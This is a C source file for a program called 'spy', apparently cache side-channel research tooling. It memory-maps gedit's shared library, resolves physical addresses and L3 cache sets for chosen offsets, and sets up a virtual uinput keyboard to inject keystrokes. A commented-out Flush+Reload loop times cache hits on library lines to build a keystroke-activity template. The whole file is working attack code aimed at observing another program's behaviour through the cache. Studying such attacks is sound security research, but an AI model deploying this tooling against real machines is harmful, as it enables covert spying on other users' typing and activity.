#include <linux/input-event-codes.h>
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/uinput.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../lib/constants.h"
#include "../lib/eviction.h"
#include "../lib/l3pp.h"
#include "../lib/utils.h"

void emit(int fd, int type, int code, int val) {
  struct input_event ie;
  ie.type = type;
  ie.code = code;
  ie.value = val;
  ie.time.tv_sec = 0;
  ie.time.tv_usec = 0;
  write(fd, &ie, sizeof(ie));
}

unsigned int core_id = 0;

int main(int argc, char **argv) {

  /* Example keystrokes
  int keys[] = {KEY_H, KEY_E, KEY_L, KEY_L, KEY_O, KEY_ENTER};
  for (int i = 0; i < 6; i++) {
    emit(fd_uinput, EV_KEY, keys[i], 1); // Key press
    emit(fd_uinput, EV_KEY, keys[i], 0); // Key release
    emit(fd_uinput, EV_SYN, SYN_REPORT, 0);
    usleep(100000); // 100ms delay
  }
  */

  // cat /proc/`pidof gedit`/maps | grep libgedit | grep "r-x"
  if (argc != 7)
    exit(!fprintf(stderr,
                  "  usage: ./spy <addressrange> <perms> <offset> "
                  "<dev> <inode> <filename>\n"
                  "example: ./spy 7fe0674cf000-7fe067511000 r-xp "
                  "0001d000 103:04 276872 "
                  "/usr/lib/x86_64-linux-gnu/gedit/libgedit-44.so\n"
                  "parameters can be found using cat /proc/{pid}/maps\n"));
  unsigned char *start = 0;
  unsigned char *end = 0;

  /* process inputs from user parameters */
  if (!sscanf(argv[1], "%p-%p", &start, &end))
    exit(!printf("address range error\n"));
  size_t range = end - start;

  size_t offset = 0;
  if (!sscanf(argv[3], "%lx", &offset))
    exit(!printf("offset error\n"));

  char filename[4096];
  if (!sscanf(argv[6], "%s", filename))
    exit(!fprintf(stderr, "filename error\n"));

  /* initialize keyboard */
  int fd_uinput = open("/dev/uinput", O_WRONLY | O_NONBLOCK);
  if (fd_uinput < 0) {
    perror("open");
    return 1;
  } // Enable key events
  ioctl(fd_uinput, UI_SET_EVBIT, EV_KEY);
  ioctl(fd_uinput, UI_SET_EVBIT, EV_SYN);
  for (int i = 0; i < 256; i++)
    ioctl(fd_uinput, UI_SET_KEYBIT, i); // Setup uinput device
  struct uinput_setup usetup;
  memset(&usetup, 0, sizeof(usetup));
  snprintf(usetup.name, UINPUT_MAX_NAME_SIZE, "uinput-keyboard");
  usetup.id.bustype = BUS_USB;
  usetup.id.vendor = 0x1234;
  usetup.id.product = 0x5678;
  usetup.id.version = 1;
  ioctl(fd_uinput, UI_DEV_SETUP, &usetup);
  ioctl(fd_uinput, UI_DEV_CREATE);
  sleep(1);

  /* direct memory mapping to the file for shared memory */
  int fd = open(filename, O_RDONLY);
  unsigned char *addr =
      (unsigned char *)mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);

  if (addr == MAP_FAILED) {
    printf("mmap failed: %s\n", strerror(errno));
  }

  printf("range: %lx, offset: %lx, filename: %s, base addr: %p\n", range,
         offset, filename, addr);

  void *lib_start = addr + offset;
  int threshold = threshold_from_flush(lib_start);

  int NUM_LINES = range / 64;
  uint64_t DURATION = 6000; // 1 second on a 3 GHz processor
  uint64_t template[NUM_LINES];

  uint64_t offsets[] = {0x540, 0x480, 0x1dc0, 0x14c0, 0x1f00, 0x2680, 0x12c0};

  int NUM_OFFSETS = 7;
  for (int i = 0; i < NUM_OFFSETS; i++) {
    uintptr_t pa;
    uintptr_t va = lib_start + offsets[i];
    virt_to_phys_user(&pa, getpid(), va);
    int set = pa_to_set(pa, EVERGLADES);
    int slice = get_i7_2600_slice(pa);
    printf(
        "virtual address: 0x%lx, physical address: 0x%lx, set: %d, slice: %d\n",
        va, pa, set, slice);
  }

  /*
  for (size_t i = 0; i < NUM_LINES; i++) {
    uint64_t count = 0;

    for (size_t k = 0; k < 5; ++k)
      sched_yield();

    uint64_t start_time = __rdtscp(&core_id);
    void *current = lib_start + i * 64;

    uint64_t it = 0;
    while (__rdtscp(&core_id) - start_time < DURATION * 1000 * 1000) {
      _mm_clflush(current);

      // logic to prevent gedit from crashing
      // emit(fd_uinput, EV_KEY, KEY_U, 1); // Key press
      // emit(fd_uinput, EV_KEY, KEY_U, 0); // Key release
      // emit(fd_uinput, EV_SYN, SYN_REPORT, 0);
      // emit(fd_uinput, EV_KEY, KEY_BACKSPACE, 1); // Key press
      // emit(fd_uinput, EV_KEY, KEY_BACKSPACE, 0); // Key release
      // emit(fd_uinput, EV_SYN, SYN_REPORT, 0);
      uint64_t start = __rdtscp(&core_id);
      while (__rdtscp(&core_id) - start < 10000)
        ;

      uint64_t duration = time_load(current);
      if (duration < threshold) {
        count++;
      }
      usleep(1000); // wait for 1 ms to avoid crashing the computer & gedit
      for (size_t k = 0; k < 5; ++k)
        sched_yield();
      it++;
    }

    template[i] = count;
    printf("%6.2f\t%s\t%8p\t%6ld\n", 100.0 * (i * 64) / range, filename,
           (void *)offset + i * 64, count);
  }

  FILE *f = fopen("chrome_libwayland-client_baseline.bin", "wb");
  fwrite(template, sizeof(uint64_t), NUM_LINES, f);
  fclose(f);
  */

  munmap(start, range);
  close(fd);
  ioctl(fd_uinput, UI_DEV_DESTROY);
  close(fd_uinput);
  return 0;
}
